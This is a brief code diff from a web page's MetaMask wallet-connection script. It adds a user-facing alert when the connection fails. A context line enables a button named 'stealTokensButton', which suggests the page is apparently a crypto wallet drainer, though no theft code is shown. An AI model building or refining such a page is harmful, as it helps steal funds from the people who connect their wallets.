@@ -60,6 +60,7 @@
                     document.getElementById("stealTokensButton").disabled = false;
                 } catch (error) {
                     console.error("Wallet connection failed:", error);
+                    alert("Failed to connect wallet. Please check your MetaMask.");
                 }
             } else {
                 alert("Please install MetaMask to connect your wallet.");
